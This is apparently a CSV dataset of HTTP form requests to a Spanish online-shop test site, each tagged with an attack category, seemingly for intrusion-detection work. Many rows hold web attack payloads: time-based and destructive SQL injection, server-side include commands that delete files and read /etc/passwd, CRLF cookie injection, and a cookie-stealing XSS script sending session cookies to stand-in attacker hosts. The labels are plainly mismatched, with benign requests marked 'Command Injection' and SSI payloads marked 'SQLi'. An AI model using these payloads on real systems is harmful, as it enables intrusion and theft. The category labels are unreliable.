payload,category
"registro | zug | alternaci-59 | Manel');waitfor delay '0:0:15';-- | Llimes | partridge@tamarit.com.gs | 23404560J | Camino Uba, 121,  | Art�s | 06892 | Toledo | 5728967696273314 | Registrar HTTP/1.1",SQLi
"registro | zug | alternaci-59 | Manel | Llimes | partridge@tamarit.com.gs | 23404560J | Camino Uba, 121,  | Art�s | 06892 | Toledo | 5728967696273314 | Registrar HTTP/1.1",Command Injection
"Vaciar carrito""><!--#EXEC cmd=""dir ""-->< HTTP/1.1",SQLi
"registro | jeanloui | remosquearse | Evelio | Fonfria Castillero | sprerris-apfel@tresbrujas.bn | 89061921X | C/ Cervantes 117, 10?G | �rbel del Castillo'OR'a='a | 50343 | Palencia | 9895940721818753 | Registrar HTTP/1.1",Command Injection
"registro | jeanloui | any%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727 | Evelio | Fonfria Castillero | sprerris-apfel@tresbrujas.bn | 89061921X | C/ Cervantes 117, 10?G | �rbel del Castillo | 50343 | Palencia | 9895940721818753 | Registrar HTTP/1.1",Command Injection
"registro | jeanloui | remosquearse | Evelio | Fonfria Castillero | sprerris-apfel@tresbrujas.bn | 89061921X | C/ Cervantes 117, 10?G | Villafranca /del Campo | 50343 | Palencia | 9895940721818753 | Registrar HTTP/1.1",Command Injection
2/ | Jam�n Ib�rico | 100 | 28 | A�adir al carrito HTTP/1.1,Command Injection
1 | Jam�n Ib�rico | 100 | 28 | A�adir al carrito HTTP/1.1,Command Injection
entrar | AND 1=1 | 815ja4 | on | Entrar HTTP/1.1,Command Injection
entrar | tammy5 | forzam'ie/n/to | on | Entrar HTTP/1.1,Command Injection
entrar | tammy5 | 815ja4 | on | Entrar HTTP/1.1,Command Injection
1+ HTTP/1.1,Other
Credenciales incorrectasany%0ASet-cookie%3A+Tamper%3D1041264011025374727 HTTP/1.1,Encoded Attack
insertar | 37 | Confirmar/ HTTP/1.1,Command Injection
insertar | 37 | Confirmar HTTP/1.1,Command Injection
"registro | pezzullo | 3s3LAVo3�a | Cipriana | Maza de Lizana Busqueta | %20 | 86251880V | Calle Nuria, 8,  | Castrillo-Tejeriego | 29715 | Toledo | 7846720837144073 | Registrar HTTP/1.1",Command Injection
"registro | pezzullo | 3s3LAVo3�a | Cipriana | Maza de Lizana Busqueta | verstraete2@soyouthinkyoucandance.io | 86251880V | Calle Nuria, 8,  | Castrillo-Tejeriego | 0913A | Toledo | 7846720837144073 | Registrar HTTP/1.1",Command Injection
Vaciar carrito'OR'a='a HTTP/1.1,Other
"<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> HTTP/1.1",SQLi
"registro | gib | 3L29stRE'OR'a='a | Yarav� | Pa�ella Villasev | switzer@grandesinventos.pt | 04831932T | C/ Rio San Lorenzo, 125, 10?C | Alegr�a-Dulantzi | 34170 | Zamora | 3029147558638309 | Registrar HTTP/1.1",Command Injection
"registro | gib | 3L29stRE | Yarav� | Pa�ella Villasev | switzer@grandesinventos.pt | 04831932T | C/ Rio San Lorenzo, 125, 10?C | Alegr�a-Dulantzi | 34170 | %3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E | 3029147558638309 | Registrar HTTP/1.1",Command Injection
"registro | gib | 2,u//4ro08 | Yarav� | Pa�ella Villasev | switzer@grandesinventos.pt | 04831932T | C/ Rio San Lorenzo, 125, 10?C | Alegr�a-Dulantzi | 34170 | Zamora | 3029147558638309 | Registrar HTTP/1.1",Command Injection
"registro | gib | 3L29stRE | Yarav� | Pa�ella Villasev | switzer@grandesinventos.pt | 04831932T | C/ Rio San Lorenzo, 125, 10?C | Alegr�a-Dulantzi | 34170 | Zamora | 3029147558638309 | Registrar HTTP/1.1",Command Injection
1 | Ques+o Manchego | 85 | 10 | A�adir al carrito HTTP/1.1,Command Injection
1 | Jam�n Ib�rico | 85 | 10 | A�adir al carrito HTTP/1.1,Command Injection
entrar | fargo | engolfa | any%0D%0ASet-cookie%3A+Tamper%3D5765205567234876235 | Entrar HTTP/1.1,Command Injection
entrar | fargo | engolfa | off | Entrar HTTP/1.1,Command Injection
"','0');waitfor delay '0:0:15';-- HTTP/1.1",SQLi
Credenciales incorrectas%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E HTTP/1.1,Encoded Attack
insertar | 7641 | ';waitfor delay '0:0:15';-- HTTP/1.1,SQLi
insertar | 7641 | Pasar por caja/ HTTP/1.1,Command Injection
insertar | 7641 | Pasar por caja HTTP/1.1,Command Injection
"registro | hatty | eb�rnea | Norberto | Riu Riutort | demjanenko@gesautonomos.io | 48139097M | Cipriano De La Huerga, 45  | Fontiveros | 05146%3F | Baleares (Illes) | 6216263942492348 | Registrar HTTP/1.1",Command Injection
"registro | hatty | eb�rnea | Norberto | Riu Riutort | demjanenko@gesautonomos.io | 33A75810Q | Cipriano De La Huerga, 45  | Fontiveros | 05146 | Baleares (Illes) | 6216263942492348 | Registrar HTTP/1.1",Command Injection
"registro | hatty | eb�rnea | Norberto | Riu Riutort | demjanenko@gesautonomos.io | 48139097M | Cipriano De La Huerga, 45  | Fontiveros | 05146 | Baleares (Illes) | 6216263942492348 | Registrar HTTP/1.1",Command Injection
"registro  | knudsen | 2u6sidi7 | Arist�cles | Figueras Boado | dreese_teter0@promotorareina.sg | 46079208L | Carrer Ildefons Cerda 160  | Regueras, Las | 40152 | Navarra | 2561301894117628 | Registrar HTTP/1.1",Command Injection
"registro | knudsen | 2u6sidi7 | Arist�cles | Figueras Boado | dreese_teter0@promotorareina.sg | 46079208L | Carrer Ildefons Cerda 160  | Regueras, Las | 40152 | V+alladolid | 2561301894117628 | Registrar HTTP/1.1",Command Injection
"registro | knudsen | 2u6sidi7 | Arist�cles | Figueras Boado | dreese_teter0@promotorareina.sg | 46079208L | Carrer Ildefons Cerda 160  | Regueras, Las | 40152 | Navarra | 2561301894117628 | Registrar HTTP/1.1",Command Injection
2 | Queso Manchego';waitfor delay '0:0:15';-- | 39 | 2 | A�adir al carrito HTTP/1.1,SQLi
2 | Queso Manchego | %3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E | 2 | A�adir al carrito HTTP/1.1,Command Injection
2 | Ques+o Manchego | 39 | 2 | A�adir al carrito HTTP/1.1,Command Injection
2 | Queso Manchego | 39 | 2 | A�adir al carrito HTTP/1.1,Command Injection
entrarparos%22+style%3D%22background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&id=2 | odele | 19ler8z6r | on | Entrar HTTP/1.1,Command Injection
entrar | cari?tta | 19ler8z6r | on | Entrar HTTP/1.1,Command Injection
entrar | odele | 19ler8z6r | on | Entrar HTTP/1.1,Command Injection
Credenciales incorrectassessionid=12312312& username=%3C%73%63%72%69%70%74%3E%64%6F%63%75%6D%65%6E%74%2E%6C%6F%63%61%74%69%6F%6E%3D%27%68%74%74%70%3A%2F%2F%61%74%74%61%63%6B%65%72%68%6F%73%74%2E%65%78%61%6D%70%6C%65%2F%63%67%69%2D%62%69%6E%2F%63%6F%6F%6B%69%65%73%74%65%61%6C%2E%63%67%69%3F%27%2B%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%3C%2F%73 %63%72%69%70%74%3E? HTTP/1.1,Encoded Attack
%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E | 291 | Pasar por caja HTTP/1.1,Command Injection
insertar | 291 | Confirmar/ HTTP/1.1,Command Injection
insertar | 291 | Pasar por caja HTTP/1.1,Command Injection
"registro | thac | crIn+Ada | Aliberta | Gochez | kubler5@porqueagel.ps | 49372725M | Calle Barrio De La Torre 163,  | Alar del Rey | 22770+ | Toledo | 5546440906293369 | Registrar HTTP/1.1",Command Injection
"registro | bob@<SCRipt>alert(Paros)</scrIPT>.parosproxy.org | crIn+Ada | Aliberta | Gochez | kubler5@porqueagel.ps | 49372725M | Calle Barrio De La Torre 163,  | Alar del Rey | 22770 | Toledo | 5546440906293369 | Registrar HTTP/1.1",XSS
"registro | thac | crIn+Ada | Aliberta | Gochez | kubler5@porqueagel.ps | 49372725M | Calle Barrio De La Torre 163,  | Alar del Rey | 22770 | /C�*cere*s | 5546440906293369 | Registrar HTTP/1.1",Command Injection
"registro | thac | crIn+Ada | Aliberta | Gochez | kubler5@porqueagel.ps | 49372725M | Calle Barrio De La Torre 163,  | Alar del Rey | 22770 | Toledo | 5546440906293369 | Registrar HTTP/1.1",Command Injection
"registro | beadley | colp-e | Clemencio | Marlasca | adrian@espanolynegocios.id | 07319581S | Barrio Rucandial 165,  | Pesaguero | 10320 | Sevilla | 1559596001370205 | paros%22+style%3D%22background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&id=2 HTTP/1.1",Command Injection
"registro | beadley | colp-e | Clemencio | Marlasca | adrian@espanolynegocios.id | 07319581S | Barrio Rucandial 165,  | Pesaguero | 10320 | Sevilla | 1559596001370205 | Registrar HTTP/1.1",Command Injection
2 | paros%22%20style=%22background:url(javascript:alert('Paros')) | 100 | 46 | A�adir al carrito HTTP/1.1,Command Injection
3/ | Queso Manchego | 100 | 46 | A�adir al carrito HTTP/1.1,Command Injection
2 | Queso Manchego | 100 | 46 | A�adir al carrito HTTP/1.1,Command Injection
"entrar | mast+en,br | 7T3c484 | on | Entrar HTTP/1.1",Command Injection
entrar | parisen | 7T3c484 | on | Entrar HTTP/1.1,Command Injection
paros%22+style%3D%22background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&id=2 HTTP/1.1,Encoded Attack
insertar | 3833 | Confirmar/ HTTP/1.1,Command Injection
"registro | maurice | a5l3ndi1 | Daner | Olivos Ball�s | cassini-igawa@alcantarapartners.es | 56405919Y | Practicante Cristobal  Benitez 160, 11?C | San Juan del Puerto | 49148 | Zaragoza | 9851892046707743<SCRIPT>alert(""Paros"");</SCRIPT> | Registrar HTTP/1.1",XSS
"registro | maurice | a5l3ndi1 | Daner | Olivos Ball�s | cassini-igawa@alcantarapartners.es | 56405919Y | Practicante Cristobal  Benitez 160, 11?C | San Juan del Puerto | 49148 | Va*l?ladolid | 9851892046707743 | Registrar HTTP/1.1",Command Injection
"registro | maurice | a5l3ndi1 | Daner | Olivos Ball�s | cassini-igawa@alcantarapartners.es | 56405919Y | Practicante Cristobal  Benitez 160, 11?C | San Juan del Puerto | 49148 | Zaragoza | 9851892046707743 | Registrar HTTP/1.1",Command Injection
Vaciar carritoany%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727 HTTP/1.1,Encoded Attack
"registro | richards | v0r7fica6i24 | Patricio | De Sol� Butticazany%0D%0ASet-cookie%3A+Tamper%3D5765205567234876235 | junior@esteticadayda.bo | 75911188X | C/ Candeleria 179,  | Sant Miquel de Fluvi� | 13100 | Valladolid | 5101892686215961 | Registrar HTTP/1.1",Command Injection
"registro | richards | v0r7fica6i24 | Patricio | De Sol� Butticaz | junior@esteticadayda.bo | ';waitfor delay '0:0:15';-- | C/ Candeleria 179,  | Sant Miquel de Fluvi� | 13100 | Valladolid | 5101892686215961 | Registrar HTTP/1.1",SQLi
"registro | richards | v0r7fica6i24 | Patricio | Sotelo- As.torga | junior@esteticadayda.bo | 75911188X | C/ Candeleria 179,  | Sant Miquel de Fluvi� | 13100 | Valladolid | 5101892686215961 | Registrar HTTP/1.1",Command Injection
"registro | richards | v0r7fica6i24 | Patricio | De Sol� Butticaz | junior@esteticadayda.bo | 75911188X | C/ Candeleria 179,  | Sant Miquel de Fluvi� | 13100 | Valladolid | 5101892686215961 | Registrar HTTP/1.1",Command Injection
1 | Queso Manchego | 39 | 8 | %00 HTTP/1.1,Command Injection
1 | Queso Manchego | 39 | 8 | A�adir al carrito HTTP/1.1,Command Injection
"entrar | dadang','0','0');waitfor delay '0:0:15';-- | 6a1er87 | on | Entrar HTTP/1.1",SQLi
entrar | dadang | mo/n2ep/�o | on | Entrar HTTP/1.1,Command Injection
entrar | dadang | 6a1er87 | on | Entrar HTTP/1.1,Command Injection
sessionid=12312312& username=<script>document.location='http://hacker .example.com/cgi-bin/cookiesteal.cgi?'+ document.cookie</script> HTTP/1.1,XSS
"insertar | 6801 | ""><!--#EXEC cmd=""dir ""-->< HTTP/1.1",SQLi
insertar | 6801 | Confirmar/ HTTP/1.1,Command Injection
insertar | 6801 | Confirmar HTTP/1.1,Command Injection
"registro | sabadash | gurullada | Sergio | Dinardi Compres | wences.seigner@aldufa.es | 92012174F | Valldemosa, 129 4H | Frumales | 19490 | Valencia | 5024784015351535<SCRIPT>alert(""Paros"");</SCRIPT> | Registrar HTTP/1.1",XSS
"registro | sabadash | gurullada | Sergio | Dinardi Compres | wences.seigner@aldufa.es | 92012174F | C/ Z*abal*+buru, 71,  | Frumales | 19490 | Valencia | 5024784015351535 | Registrar HTTP/1.1",Command Injection
"registro | sabadash | gurullada | Sergio | Dinardi Compres | wences.seigner@aldufa.es | 92012174F | Valldemosa, 129 4H | Frumales | 19490 | Valencia | 5024784015351535 | Registrar HTTP/1.1",Command Injection
"registro | thege | abstruso%00 | Guida | Lambarri | mcclellan.truex@faders.com.cl | 62140654J | Txapitela, 183 13?G | Sant Feliu Sasserra | 04569 | Toledo | 1284694854341650 | Registrar HTTP/1.1",Command Injection
"registro | thege | abstruso | Guida | Lambarri | mcclellan.truex@faders.com.cl | 62140654J | Txapitela, 183 13?G | Man+tin*os | 04569 | Toledo | 1284694854341650 | Registrar HTTP/1.1",Command Injection
"registro | thege | abstruso | Guida | Lambarri | mcclellan.truex@faders.com.cl | 62140654J | Txapitela, 183 13?G | Sant Feliu Sasserra | 04569 | Toledo | 1284694854341650 | Registrar HTTP/1.1",Command Injection
"1 | ""><!--#EXEC cmd=""dir ""-->< | 100 | 15 | A�adir al carrito HTTP/1.1",SQLi
1 | Queso Manchego | 39/ | 15 | A�adir al carrito HTTP/1.1,Command Injection
1 | Queso Manchego | 100 | 15 | A�adir al carrito HTTP/1.1,Command Injection
entrar | +shinji | 4I8f0 | on | Entrar HTTP/1.1,Command Injection
entrar | chiquia0 | 4I8f0 | on | Entrar HTTP/1.1,Command Injection
insertar | 4639 | Confirmar%00 HTTP/1.1,Command Injection
"insertar | 4639 | ','0','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1",SQLi
insertar | 4639 | Confirmar/ HTTP/1.1,Command Injection
insertar | 4639 | Confirmar HTTP/1.1,Command Injection
"registro | strauss | manirrota | Dania | Cucurull Forn'INJECTED_PARAM | everrett@fernandosoto.zr | 34016342D | Doctor Gomez Ulla, 7 13B | Boada de Campos | 45573 | Tarragona | 9293437709151698 | Registrar HTTP/1.1",Command Injection
"registro | strauss | manirrota | Dania | Alc�ce.+r | everrett@fernandosoto.zr | 34016342D | Doctor Gomez Ulla, 7 13B | Boada de Campos | 45573 | Tarragona | 9293437709151698 | Registrar HTTP/1.1",Command Injection
"registro | strauss | manirrota | Dania | Cucurull Forn | everrett@fernandosoto.zr | 34016342D | Doctor Gomez Ulla, 7 13B | Boada de Campos | 45573 | Tarragona | 9293437709151698 | Registrar HTTP/1.1",Command Injection
'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% HTTP/1.1,SQLi
"registro | amar | encallecer | Celedonio | Compres Manau | danielson@bloodline.mc | 45415076N | Valladolid, 99 7A""><!--#EXEC cmd=""dir ""-->< | Borges del Camp, Les | 50343 | Baleares (Illes) | 1817134739036015 | Registrar HTTP/1.1",SQLi
"registro | amar | encallecer | Celedonio | Compres Manau | danielson@bloodline.mc | 45415076N | Valladolid, 99 7A | Borges del Camp, Les | 50343 | Salama/nca | 1817134739036015 | Registrar HTTP/1.1",Command Injection
"registro | amar | encallecer | Celedonio | Compres Manau | danielson@bloodline.mc | 45415076N | Valladolid, 99 7A | Borges del Camp, Les | 50343 | Baleares (Illes) | 1817134739036015 | Registrar HTTP/1.1",Command Injection
"3 | Vino Rioja | 39 | 69 | ','0','0');waitfor delay '0:0:15';-- HTTP/1.1",SQLi
1/ | Vino Rioja | 39 | 69 | A�adir al carrito HTTP/1.1,Command Injection
3 | Vino Rioja | 39 | 69 | A�adir al carrito HTTP/1.1,Command Injection
entrar | p+ap*e | 74oNc0 | on | Entrar HTTP/1.1,Command Injection
entrar | ince | 74oNc0 | on | Entrar HTTP/1.1,Command Injection
'INJECTED_PARAM HTTP/1.1,Other
insertar | 3089 | | HTTP/1.1,Command Injection
insertar | 3089 | Confirmar/ HTTP/1.1,Command Injection
insertar | 3089 | Pasar por caja HTTP/1.1,Command Injection
"registro | zander | arca�sta | Zain | Espriella Morcossessionid=12312312& username=%3C%73%63%72%69%70%74%3E%64%6F%63%75%6D%65%6E%74%2E%6C%6F%63%61%74%69%6F%6E%3D%27%68%74%74%70%3A%2F%2F%61%74%74%61%63%6B%65%72%68%6F%73%74%2E%65%78%61%6D%70%6C%65%2F%63%67%69%2D%62%69%6E%2F%63%6F%6F%6B%69%65%73%74%65%61%6C%2E%63%67%69%3F%27%2B%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%3C%2F%73 %63%72%69%70%74%3E? | skala@lamarsrl.la | 28264646S | Nardo, 106, 7-H | Torrecampo | 46315 | Alicante | 5436324330428646 | Registrar HTTP/1.1",Command Injection
"registro | zander | arca�sta | Zain | Espriella Morcos | skala@lamarsrl.la | 28264646S | Nardo, 106, 7-H | <!--#include file=""archivo_secreto"" --> | 46315 | Alicante | 5436324330428646 | Registrar HTTP/1.1",SQLi
"registro | zander | arca�sta | Zain | Espriella Morcos | skala@lamarsrl.la | 28264646S | Nardo, 106, 7-H | Torrecampo | 46315 | Alicante | 878731290934670A | Registrar HTTP/1.1",Command Injection
"registro | zander | arca�sta | Zain | Espriella Morcos | skala@lamarsrl.la | 28264646S | Nardo, 106, 7-H | Torrecampo | 46315 | Alicante | 5436324330428646 | Registrar HTTP/1.1",Command Injection
registro | chauhan | +rabosea4 | Nelma | Madrera Ib��ez | drayton@callalabocaatiaherminia.int | 71628074W | C/ Musico Juan De Encinas 10 8?C | Vilanova i la Geltr� | 48390 | Burgos | 1031009266580150 | Registrar%3F HTTP/1.1,Command Injection
"registro | chauhan | +rabosea4 | Nelma | J-o.rba Cl,ua | drayton@callalabocaatiaherminia.int | 71628074W | C/ Musico Juan De Encinas 10 8?C | Vilanova i la Geltr� | 48390 | Burgos | 1031009266580150 | Registrar HTTP/1.1",Command Injection
2 | Jam�n Ib�rico | 'OR'a='a | 84 | A�adir al carrito HTTP/1.1,Command Injection
2 | Jam�n Ib�rico | 100/ | 84 | A�adir al carrito HTTP/1.1,Command Injection
2 | Jam�n Ib�rico | 85 | 84 | A�adir al carrito HTTP/1.1,Command Injection
"entrar | lutz | OpimA | off""><!--#EXEC cmd=""dir ""-->< | Entrar HTTP/1.1",SQLi
entrar | lutz | 'OR'a='a | off | Entrar HTTP/1.1,Command Injection
entrar | lutz | OpimA | on/ | Entrar HTTP/1.1,Command Injection
entrar | lutz | OpimA | off | Entrar HTTP/1.1,Command Injection
"Credenciales incorrectas<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> HTTP/1.1",SQLi
"insertar""><!--#EXEC cmd=""dir ""-->< | 8962 | Confirmar HTTP/1.1",SQLi
insertar | 8962 | %3F HTTP/1.1,Command Injection
insertar | 8962 | Confirmar/ HTTP/1.1,Command Injection
insertar | 8962 | Confirmar HTTP/1.1,Command Injection
"registro | steene | h3millos6 | Monserrat | Barber� | nachum@enmenorca.com.ma | 50805644R | Calle Due�as, 60,  | Medrano@40 | 22439 | Zaragoza | 6147677145944254 | Registrar HTTP/1.1",Command Injection
"registro | steene | h3millos6 | Monserrat | Barber� | nachum@enmenorca.com.ma | 50805644R | Calle Due�as, 60,  | Medrano | 22439 | Ba?d??ajoz | 6147677145944254 | Registrar HTTP/1.1",Command Injection
"registro | steene | h3millos6 | Monserrat | Barber� | nachum@enmenorca.com.ma | 50805644R | Calle Due�as, 60,  | Medrano | 22439 | Zaragoza | 6147677145944254 | Registrar HTTP/1.1",Command Injection
"registro | ploof | g47d8�6ador | Virma | Llarden Romeu | bresslau@altoguadiana.ee | 31881769C | Calle Picos De Europa, 65 1?H | Dehesa de Romanos | <SCRIPT>alert(""Paros"");</SCRIPT> | Burgos | 6103925352151214 | Registrar HTTP/1.1",XSS
"registro | ploof | g47d8�6ador | Virma | Llarden Romeu | @ghosh@venderf@otografias.ae | 31881769C | Calle Picos De Europa, 65 1?H | Dehesa de Romanos | 33870 | Burgos | 6103925352151214 | Registrar HTTP/1.1",Command Injection
"registro | ploof | g47d8�6ador | Virma | Llarden Romeu | bresslau@altoguadiana.ee | 31881769C | Calle Picos De Europa, 65 1?H | Dehesa de Romanos | 33870 | Burgos | 6103925352151214 | Registrar HTTP/1.1",Command Injection
"2 | Vino Rioja | 39 | 28','0');waitfor delay '0:0:15';-- | A�adir al carrito HTTP/1.1",SQLi
2 | Vino Rioja | 85/ | 28 | A�adir al carrito HTTP/1.1,Command Injection
2 | Vino Rioja | 39 | 28 | A�adir al carrito HTTP/1.1,Command Injection
entrar | ozzy | respuesto | on/ | Entrar HTTP/1.1,Command Injection
entrar | ozzy | respuesto | on | Entrar HTTP/1.1,Command Injection
sessionid=12312312& username=%3C%73%63%72%69%70%74%3E%64%6F%63%75%6D%65%6E%74%2E%6C%6F%63%61%74%69%6F%6E%3D%27%68%74%74%70%3A%2F%2F%61%74%74%61%63%6B%65%72%68%6F%73%74%2E%65%78%61%6D%70%6C%65%2F%63%67%69%2D%62%69%6E%2F%63%6F%6F%6B%69%65%73%74%65%61%6C%2E%63%67%69%3F%27%2B%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%3C%2F%73 %63%72%69%70%74%3E? HTTP/1.1,Encoded Attack
insertar | %00 | Confirmar HTTP/1.1,Command Injection
insertar | 5999 | Confirmar/ HTTP/1.1,Command Injection
"registro | leonerd | 6a6o57a | Christopher | Silva | havoc8@g-audi.eg | 56405919Y | C/ Miquel Palomares, 73 7?C | Bidegoian | 16415 | Almer�a | 7329932302042221 | Registrar'INJECTED_PARAM HTTP/1.1",Command Injection
